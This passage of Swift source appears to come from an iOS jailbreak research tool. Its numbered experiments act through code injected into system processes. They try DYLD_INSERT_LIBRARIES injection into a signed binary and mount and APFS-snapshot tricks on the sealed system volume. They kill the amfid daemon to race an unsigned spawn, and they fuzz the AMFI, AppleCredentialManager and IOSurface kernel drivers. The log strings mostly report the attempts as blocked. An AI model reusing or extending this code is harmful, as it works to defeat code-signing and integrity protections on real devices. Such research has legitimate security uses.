                    detail += "status=0x\(String(format: "%x", status)) (exit=\(exitCode), sig=\(sig))\n"
                }
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr2)
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 3: Trust Cache â€” DISABLED (neighbor scan causes panic)
        // Reading arbitrary addresses near pmap_cs hits inaccessible zones
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 3: Trust Cache scan â•â•â•\n"
        detail += "âš ï¸ DISABLED â€” scanning kernel memory near pmap_cs causes panic\n"
        detail += "Socket KRW cannot safely read arbitrary __DATA addresses\n"
        let pointerCandidates: [(Int, UInt64)] = []
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 4: IOSurface external method 9 (getValue)
        // IOSurface user client has methods that read/write kernel objects
        // Selector 9 = s_get_value, Selector 10 = s_set_value
        // These operate on IOSurface properties in kernel heap!
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 4: IOSurface getValue/setValue â•â•â•\n"
        
        guard let sb = dspmgr.shared.sbProc else {
            detail += "No SpringBoard RC\n"
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
        }
        
        let sbMem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Open IOSurfaceRoot user client
        let ioSvcName = remote_alloc_str(sb, "IOSurfaceRoot")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", ioSvcName)
        let ioSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        if ioSvc != 0 {
            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
            let connectAddr = sbMem + 0x1A00
            sb[connectAddr].setValue32(0)
            let openRet = RootExecutor.rcall(sb, "IOServiceOpen", ioSvc, taskSelf, 0, connectAddr)
            let ioConnect = sb[connectAddr].value32()
            
            detail += "IOSurfaceRoot: connect=\(ioConnect), ret=0x\(String(format: "%x", openRet))\n"
            
            if openRet == 0 && ioConnect != 0 {
                // Try external method selectors 6-15 (IOSurface has ~30 methods)
                // Selector 6 = create, 9 = get_value, 10 = set_value, etc.
                let scalarIn = sbMem + 0x2000
                let scalarOut = sbMem + 0x2200
                let scalarOutCnt = sbMem + 0x2400
                
                let testSelectors = [6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
                for sel in testSelectors {
                    sb[scalarIn].setValue64(0)
                    sb[scalarOutCnt].setValue32(16)
                    let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                                UInt64(ioConnect), UInt64(sel),
                                                0, 0,
                                                scalarOut, scalarOutCnt)
                    if ret == 0 {
                        let out = sb[scalarOut].value64()
                        detail += "  âœ… IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
                        anySuccess = true
                    } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                        detail += "  âš ï¸ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
                
                RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioConnect))
            }
        } else {
            detail += "IOSurfaceRoot service not found\n"
        }
        RootExecutor.rcall(sb, "free", ioSvcName)
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 5: Spawn signed binary via symlink (already works!)
        // + try to make it load OUR dylib via DYLD_INSERT_LIBRARIES
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 5: DYLD_INSERT via env â•â•â•\n"
        
        // Write a fake dylib to /tmp (just Mach-O header)
        let fakeDylib = "/tmp/.dsp_inject.dylib"
        let fakeAddr = remote_alloc_str(rc, fakeDylib)
        RootExecutor.rcall(rc, "unlink", fakeAddr)
        let fakeFd = RootExecutor.rcall(rc, "open", fakeAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fakeFd != UInt64(bitPattern: -1) {
            // Write minimal dylib header
            let hdrAddr = mem + 0x800
            // MH_MAGIC_64 + ARM64 + MH_DYLIB
            rc[hdrAddr].setValue64(0x0000000100000CCF)      // magic + cputype
            rc[hdrAddr + 8].setValue64(0x0000000600000000)  // filetype=MH_DYLIB + ncmds=0
            rc[hdrAddr + 16].setValue64(0x0020008500000000) // sizeofcmds=0 + flags
            rc[hdrAddr + 24].setValue64(0)                  // reserved
            RootExecutor.rcall(rc, "write", fakeFd, hdrAddr, 32)
            RootExecutor.rcall(rc, "close", fakeFd)
        }
        
        // Spawn /bin/df (SIGNED) with DYLD_INSERT_LIBRARIES pointing to our dylib
        let envBase = mem + 0x2800
        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/tmp/.dsp_inject.dylib")
        let pathEnv = remote_alloc_str(rc, "PATH=/bin:/usr/bin:/sbin")
        rc[envBase].setValue64(dyldEnv)
        rc[envBase + 8].setValue64(pathEnv)
        rc[envBase + 16].setValue64(0)
        
        let signedBin = remote_alloc_str(rc, "/bin/df")
        let argvBase3 = mem + 0x1C00
        rc[argvBase3].setValue64(signedBin)
        rc[argvBase3 + 8].setValue64(0)
        let pidAddr3 = mem + 0x1E00
        rc[pidAddr3].setValue64(0)
        
        let dyldRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr3, signedBin, 0, 0, argvBase3, envBase)
        let dyldPid = rc[pidAddr3].value32()
        RootExecutor.rcall(rc, "usleep", 500000)
        let dyldWait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        detail += "Spawn /bin/df + DYLD_INSERT: ret=\(dyldRet), pid=\(dyldPid), wait=\(dyldWait)\n"
        
        if dyldRet == 0 {
            detail += "Spawn succeeded â€” check if dylib was loaded (need output capture)\n"
            // If DYLD_INSERT works â†’ we can inject code into ANY signed process!
        }
        
        RootExecutor.rcall(rc, "free", dyldEnv)
        RootExecutor.rcall(rc, "free", pathEnv)
        RootExecutor.rcall(rc, "free", signedBin)
        RootExecutor.rcall(rc, "free", fakeAddr)
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "unlink", remote_alloc_str(rc, fakeDylib))
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // SUMMARY
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• SUMMARY â•â•â•\n"
        detail += "Paths tested: 5\n"
        detail += anySuccess ? "ðŸ”¥ Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
    }
    

    // MARK: - Experiment 63: SSV / Mount Bypass
    
    private func expSSVBypass(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "SSV / Mount Bypass Research\n\n"
        
        // Test 1: Try mount() syscall variants
        detail += "=== Test 1: mount() syscall ===\n"
        let targetDir = remote_alloc_str(rc, "/var/jb")
        RootExecutor.rcall(rc, "mkdir", targetDir, 0o755)
        
        let nullfs = remote_alloc_str(rc, "nullfs")
        let srcDir = remote_alloc_str(rc, "/usr/bin")
        let mountRet1 = RootExecutor.rcall(rc, "mount", nullfs, targetDir, 0, srcDir)
        let mountErr1 = remote_errno(rc)
        detail += "mount(nullfs): ret=\(mountRet1), errno=\(mountErr1)\n"
        
        let bindfs = remote_alloc_str(rc, "bindfs")
        let mountRet2 = RootExecutor.rcall(rc, "mount", bindfs, targetDir, 0, srcDir)
        let mountErr2 = remote_errno(rc)
        detail += "mount(bindfs): ret=\(mountRet2), errno=\(mountErr2)\n"
        
        RootExecutor.rcall(rc, "free", nullfs)
        RootExecutor.rcall(rc, "free", bindfs)
        RootExecutor.rcall(rc, "free", srcDir)
        
        // Test 2: APFS snapshot
        detail += "\n=== Test 2: APFS Snapshots ===\n"
        let rootPath = remote_alloc_str(rc, "/")
        let rootFd = RootExecutor.rcall(rc, "open", rootPath, UInt64(O_RDONLY), 0)
        detail += "open(/): fd=\(rootFd == UInt64(bitPattern: -1) ? -1 : Int64(rootFd))\n"
        
        if rootFd != UInt64(bitPattern: -1) {
            let snapName = remote_alloc_str(rc, "dsploit_snap")
            let createRet = RootExecutor.rcall(rc, "fs_snapshot_create", rootFd, snapName, 0)
            let createErr = remote_errno(rc)
            detail += "fs_snapshot_create(/): ret=\(createRet), errno=\(createErr)\n"
            if createRet == 0 { detail += "SNAPSHOT CREATED!\n" }
            RootExecutor.rcall(rc, "free", snapName)
            RootExecutor.rcall(rc, "close", rootFd)
        }
        
        // Test 3: Snapshot on /var
        detail += "\n=== Test 3: Snapshot on /var ===\n"
        let varPath = remote_alloc_str(rc, "/private/var")
        let varFd = RootExecutor.rcall(rc, "open", varPath, UInt64(O_RDONLY), 0)
        if varFd != UInt64(bitPattern: -1) {
            let snapName2 = remote_alloc_str(rc, "dsploit_var")
            let createRet2 = RootExecutor.rcall(rc, "fs_snapshot_create", varFd, snapName2, 0)
            let createErr2 = remote_errno(rc)
            detail += "fs_snapshot_create(/var): ret=\(createRet2), errno=\(createErr2)\n"
            if createRet2 == 0 {
                detail += "VAR SNAPSHOT CREATED!\n"
                RootExecutor.rcall(rc, "fs_snapshot_delete", varFd, snapName2, 0)
            }
            RootExecutor.rcall(rc, "free", snapName2)
            RootExecutor.rcall(rc, "close", varFd)
        }
        RootExecutor.rcall(rc, "free", varPath)
        RootExecutor.rcall(rc, "free", rootPath)
        RootExecutor.rcall(rc, "free", targetDir)
        
        // Test 4: Mount flags
        detail += "\n=== Test 4: Mount info ===\n"
        let stPath = remote_alloc_str(rc, "/")
        let stBuf = mem + 0x1000
        if RootExecutor.rcall(rc, "statfs", stPath, stBuf) == 0 {
            let flags = rc[stBuf + 0x28].value32()
            detail += "/ flags: 0x\(String(format: "%x", flags))"
            if flags & 0x1 != 0 { detail += " RDONLY" }
            if flags & 0x1000 != 0 { detail += " LOCAL" }
            detail += "\n"
        }
        RootExecutor.rcall(rc, "free", stPath)
        
        let success = detail.contains("CREATED")
        return ExperimentResult(name: "SSV/Mount bypass", success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Experiment 64: CoreTrust Signature Research
    
    private func expCoreTrustResearch(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Signature Research\n\n"
        let pid = RootExecutor.rcall(rc, "getpid")
        
        // Test 1: Read code signature blob
        detail += "=== Test 1: Code signature blob ===\n"
        let blobBuf = mem + 0x2000
        let csRet = RootExecutor.rcall(rc, "csops", pid, 5, blobBuf, 4096)
        detail += "csops(CS_OPS_BLOB): ret=\(csRet)\n"
        if csRet == 0 {
            let magic = rc[blobBuf].value32()
            let length = rc[blobBuf + 4].value32()
            detail += "magic=0x\(String(format: "%x", magic)), length=\(length)\n"
            if magic == 0xfade0cc0 {
                let count = rc[blobBuf + 8].value32()
                detail += "Valid SuperBlob! count=\(count)\n"
            }
        }
        
        // Test 2: cs_flags analysis
        detail += "\n=== Test 2: CS flags ===\n"
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csFlags = rc[statusAddr].value32()
        detail += "cs_flags: 0x\(String(format: "%x", csFlags))\n"
        if csFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csFlags & 0x20000000 != 0 { detail += "  CS_RUNTIME\n" }
        if csFlags & 0x1 != 0 { detail += "  CS_VALID\n" }
        
        // Test 3: MISValidateSignatureAndCopyInfo
        detail += "\n=== Test 3: MIS validation ===\n"
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Load Security/MIS framework FIRST (might not be loaded in launchd)
        let fwPath = remote_alloc_str(rc, "/System/Library/Frameworks/Security.framework/Security")
        let fwHandle = RootExecutor.rcall(rc, "dlopen", fwPath, 1)
        RootExecutor.rcall(rc, "free", fwPath)
        let misPath = remote_alloc_str(rc, "/usr/lib/libmis.dylib")
        RootExecutor.rcall(rc, "dlopen", misPath, 1)
        RootExecutor.rcall(rc, "free", misPath)
        
        let misValidate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "MISValidateSignatureAndCopyInfo"))
        detail += "Security.framework: \(fwHandle != 0 ? "loaded" : "failed")\n"
        detail += "MISValidateSignatureAndCopyInfo: \(misValidate != 0 ? "FOUND" : "not available")\n"
        
        if misValidate != 0 {
            detail += "\nMIS function available but CANNOT call from launchd (causes panic).\n"
            detail += "MIS internally connects to amfid via XPC — crashes without proper context.\n"
            detail += "Would need to call from amfid itself (which we can't RC into).\n"
        }
        
        // Test 4: Provisioning profile paths
        detail += "\n=== Test 4: Provisioning profiles ===\n"
        let paths = ["/var/MobileDevice/ProvisioningProfiles", "/var/db/MobileIdentity"]
        for path in paths {
            let p = remote_alloc_str(rc, path)
            let ret = RootExecutor.rcall(rc, "stat", p, mem + 0x1000)
            detail += "\(path): \(ret == 0 ? "EXISTS" : "missing")\n"
            RootExecutor.rcall(rc, "free", p)
        }
        
        let success = detail.contains("FOUND") || detail.contains("VALID")
        return ExperimentResult(name: "CoreTrust research", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 65: amfid Kill Race
    
    /// Kill amfid daemon + immediately try to spawn unsigned binary
    /// amfid auto-restarts (KeepAlive) but there's a window where it's dead
    /// If kernel waits for amfid response and times out → might default-allow
    /// SAFE: worst case = respring (amfid restarts, no bootloop)
    private func expAmfidKillRace(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "amfid Kill Race Experiment\n\n"
        
        // Step 1: Find amfid PID
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "amfid not found!\n"
            return ExperimentResult(name: "amfid kill race", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        
        // Step 2: Prepare copied binary BEFORE killing amfid
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_race_bin")
        RootExecutor.rcall(rc, "unlink", dstPath)
        
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        detail += "Binary prepared at /tmp/.dsp_race_bin\n\n"
        
        // Step 3: Setup spawn args (ready to fire immediately after kill)
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(dstPath)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x1E00
        
        // Step 4: KILL amfid!
        detail += "=== KILLING amfid (PID \(amfidPid)) ===\n"
        let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9) // SIGKILL
        detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"
        
        // Step 5: IMMEDIATELY try to spawn (race window!)
        // No usleep — spawn as fast as possible while amfid is dead
        rc[pidAddr].setValue64(0)
        let spawnRet1 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid1 = rc[pidAddr].value32()
        detail += "Spawn attempt 1 (immediate): ret=\(spawnRet1), pid=\(spawnPid1)\n"
        
        // Try again quickly
        rc[pidAddr].setValue64(0)
        let spawnRet2 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid2 = rc[pidAddr].value32()
        detail += "Spawn attempt 2: ret=\(spawnRet2), pid=\(spawnPid2)\n"
        
        // Try once more
        rc[pidAddr].setValue64(0)
        let spawnRet3 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid3 = rc[pidAddr].value32()
        detail += "Spawn attempt 3: ret=\(spawnRet3), pid=\(spawnPid3)\n"
        
        // Step 6: Wait and check if amfid restarted
        RootExecutor.rcall(rc, "usleep", 2000000) // 2s — let amfid restart
        
        let newAmfidProc = mgr.findProc(name: "amfid")
        if newAmfidProc != 0 {
            let newPid = ds_kread32(newAmfidProc + UInt64(off_proc_p_pid))
            detail += "\namfid restarted! New PID: \(newPid)\n"
        } else {
            detail += "\namfid NOT restarted yet (might cause issues)\n"
        }
        
        // Step 7: Analyze results
        detail += "\n=== RESULTS ===\n"
        let anySuccess = spawnRet1 == 0 || spawnRet2 == 0 || spawnRet3 == 0
        
        if anySuccess {
            detail += "SPAWN SUCCEEDED WHILE AMFID WAS DEAD!\n"
            detail += "This means kernel DEFAULT-ALLOWS when amfid unavailable!\n"
            detail += "FULL JAILBREAK PATH: kill amfid + spawn = bypass!\n"
            
            // Wait for spawned process
            RootExecutor.rcall(rc, "usleep", 1000000)
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            let status = rc[statusAddr].value32()
            let exited = (status & 0x7F) == 0
            let sig = status & 0x7F
            
            if exited {
                detail += "Process EXITED NORMALLY! Binary executed!\n"
            } else if sig == 9 {
                detail += "Process was SIGKILL'd (amfid restarted and killed it)\n"
                detail += "But spawn DID succeed — need faster execution\n"
            }
        } else {
            detail += "All spawns failed (ret=\(spawnRet1)/\(spawnRet2)/\(spawnRet3))\n"
            if spawnRet1 == 13 {
                detail += "EACCES — kernel enforces AMFI independently of amfid\n"
                detail += "Killing amfid does NOT bypass code signing\n"
            } else {
                detail += "Different error — might be timing related\n"
            }
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        return ExperimentResult(name: "amfid kill race", success: anySuccess, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 66: IOKit Driver Fuzzer (LAST TRY)
    
    /// Targeted fuzzing of IOKit external methods
    /// Looking for: OOB read/write, type confusion, integer overflow
    /// Targets: AMFI (11 methods), IOSurfaceRoot, AppleCredentialManager
    /// Strategy: send crafted struct inputs that commonly trigger bugs
    private func expIOKitFuzzer() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit Fuzzer", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "IOKit Driver Targeted Fuzzer\n\n"
        var anomalies: [(String, String)] = []
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        
        // Helper: open a service
        func openService(_ name: String) -> UInt32 {
            let nameAddr = remote_alloc_str(sb, name)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            guard matchDict != 0 else { RootExecutor.rcall(sb, "free", nameAddr); return 0 }
            let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
            guard svc != 0 else { RootExecutor.rcall(sb, "free", nameAddr); return 0 }
            let connectAddr = mem + 0x1A00
            sb[connectAddr].setValue32(0)
            let ret = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
            RootExecutor.rcall(sb, "free", nameAddr)
            return ret == 0 ? sb[connectAddr].value32() : 0
        }
        
        // Fuzz patterns that commonly trigger bugs
        let fuzzPatterns: [(String, [UInt64])] = [
            ("zeros", [0, 0, 0, 0, 0, 0, 0, 0]),
            ("max_u32", [0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0]),
            ("max_u64", [0xFFFFFFFFFFFFFFFF, 0, 0, 0, 0, 0, 0, 0]),
            ("negative", [UInt64(bitPattern: -1), UInt64(bitPattern: -2), 0, 0, 0, 0, 0, 0]),
            ("large_size", [0x41414141, 0x7FFFFFFF, 0, 0, 0, 0, 0, 0]),
            ("kernel_ptr", [0xFFFFFFF000000000, 0, 0, 0, 0, 0, 0, 0]),
            ("heap_ptr", [0xFFFFFFFE00000000, 0, 0, 0, 0, 0, 0, 0]),
            ("small_ints", [1, 2, 3, 4, 5, 6, 7, 8]),
        ]
        
        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00
        
        // ═══ FUZZ AMFI (11 active selectors: 2,4,5,6,7,9,11,12,13,14,15) ═══
        detail += "=== AMFI External Methods ===\n"
        let amfiConnect = openService("AppleMobileFileIntegrity")
        
        if amfiConnect != 0 {
            detail += "AMFI connect=\(amfiConnect)\n"
            let amfiSelectors = [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
            
            for sel in amfiSelectors.prefix(6) {
                for (patName, pattern) in fuzzPatterns.prefix(5) {
                    // Write pattern to struct input
                    for (i, val) in pattern.prefix(4).enumerated() {
                        sb[structIn + UInt64(i * 8)].setValue64(val)
                    }
                    sb[structOutSize].setValue64(256)
                    
                    // Try struct method
                    let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                                UInt64(amfiConnect), UInt64(sel),
                                                structIn, 32,
                                                structOut, structOutSize)
                    
                    let outSize = sb[structOutSize].value64()
                    
                    // Check for anomalies
                    if ret == 0 {
                        anomalies.append(("AMFI sel\(sel) \(patName)", "SUCCESS! outSize=\(outSize)"))
                        detail += "  !! sel \(sel) + \(patName): ret=0, out=\(outSize)\n"
                    } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 {
                        // Unexpected error code = interesting
                        let retHex = String(format: "0x%x", ret)
                        if ret != 0xe0000001 {
                            anomalies.append(("AMFI sel\(sel) \(patName)", "unusual ret=\(retHex)"))
                            detail += "  ? sel \(sel) + \(patName): ret=\(retHex)\n"
                        }
                    }
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(amfiConnect))
        } else {
            detail += "Cannot open AMFI\n"
        }
        
        // ═══ FUZZ AppleCredentialManager ═══
        detail += "\n=== AppleCredentialManager ===\n"
        let credConnect = openService("AppleCredentialManager")
        
        if credConnect != 0 {
            detail += "CredMgr connect=\(credConnect)\n"
            
            for sel in 0..<10 {
                for (patName, pattern) in fuzzPatterns.prefix(4) {
                    for (i, val) in pattern.prefix(4).enumerated() {
                        sb[structIn + UInt64(i * 8)].setValue64(val)
                    }
                    sb[structOutSize].setValue64(256)
                    
                    let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                                UInt64(credConnect), UInt64(sel),
                                                structIn, 32,
                                                structOut, structOutSize)
                    
                    if ret == 0 {
                        let outSize = sb[structOutSize].value64()
                        anomalies.append(("CredMgr sel\(sel) \(patName)", "SUCCESS! out=\(outSize)"))
                        detail += "  !! sel \(sel) + \(patName): SUCCESS out=\(outSize)\n"
                        
                        // Read output data
                        if outSize > 0 && outSize <= 64 {
                            var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                            sb.remoteRead(structOut, to: &outBuf, size: outSize)
                            let hex = outBuf.prefix(16).map { String(format: "%02x", $0) }.joined(separator: " ")
                            detail += "    data: \(hex)\n"
                        }
                    } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 && ret != 0xe0000001 {
                        anomalies.append(("CredMgr sel\(sel) \(patName)", "ret=0x\(String(format: "%x", ret))"))
                        detail += "  ? sel \(sel) + \(patName): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(credConnect))
        } else {
            detail += "Cannot open CredentialManager\n"
        }
        
        // ═══ FUZZ IOSurfaceRoot with scalar inputs ═══
        detail += "\n=== IOSurfaceRoot (scalar) ===\n"
        let ioSurfConnect = openService("IOSurfaceRoot")
        
        if ioSurfConnect != 0 {
            detail += "IOSurf connect=\(ioSurfConnect)\n"
            
            // IOSurface has methods that take scalar inputs
            // Selectors 0-30, try with various scalar counts
            for sel in [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] {
                sb[scalarIn].setValue64(0)
                sb[scalarIn + 8].setValue64(0)
                sb[scalarOutCnt].setValue32(16)
                
                let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                            UInt64(ioSurfConnect), UInt64(sel),
                                            scalarIn, 2,
                                            scalarOut, scalarOutCnt)
                
                if ret == 0 {
                    let outCnt = sb[scalarOutCnt].value32()
                    let val0 = sb[scalarOut].value64()
                    anomalies.append(("IOSurf sel\(sel)", "SUCCESS cnt=\(outCnt) val=0x\(String(format: "%llx", val0))"))
                    detail += "  !! sel \(sel): SUCCESS! cnt=\(outCnt), val=0x\(String(format: "%llx", val0))\n"
                } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 && ret != 0xe0000001 {
                    detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    anomalies.append(("IOSurf sel\(sel)", "ret=0x\(String(format: "%x", ret))"))
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioSurfConnect))
        }
        
        // ═══ SUMMARY ═══
        detail += "\n=== SUMMARY ===\n"
        detail += "Anomalies found: \(anomalies.count)\n"
        for (target, result) in anomalies.prefix(15) {
            detail += "  \(target): \(result)\n"
        }
        
        if anomalies.isEmpty {
            detail += "No anomalies — all methods properly reject invalid input.\n"
            detail += "Drivers appear hardened against basic fuzzing.\n"
        } else {
            detail += "\nAnomalies need further investigation!\n"
            detail += "SUCCESS returns = method accepted our input\n"
            detail += "Unusual ret codes = potential edge case\n"
        }
        
        let success = !anomalies.isEmpty
        return ExperimentResult(name: "IOKit Fuzzer (LAST TRY)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 67: Deep Fuzz AppleCredentialManager sel 0
    
    /// Selector 0 returns 0xfffffffd (-3) = custom error from driver logic
    /// This means our input REACHES the driver code!
    /// Now: find input that triggers different behavior (ret=0, crash, different ret)
    /// Strategy: vary struct size, content patterns, scalar vs struct
    private func expCredMgrDeepFuzz() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleCredentialManager Selector 0 — Deep Fuzz\n\n"
        var findings: [(String, UInt64)] = []
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        
        // Open AppleCredentialManager
        let nameAddr = remote_alloc_str(sb, "AppleCredentialManager")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        guard svc != 0 else {
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "Service not found", timestamp: Date())
        }
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        guard openRet == 0 && connect != 0 else {
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "Cannot open", timestamp: Date())
        }
        RootExecutor.rcall(sb, "free", nameAddr)
        detail += "connect=\(connect)\n\n"
        
        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
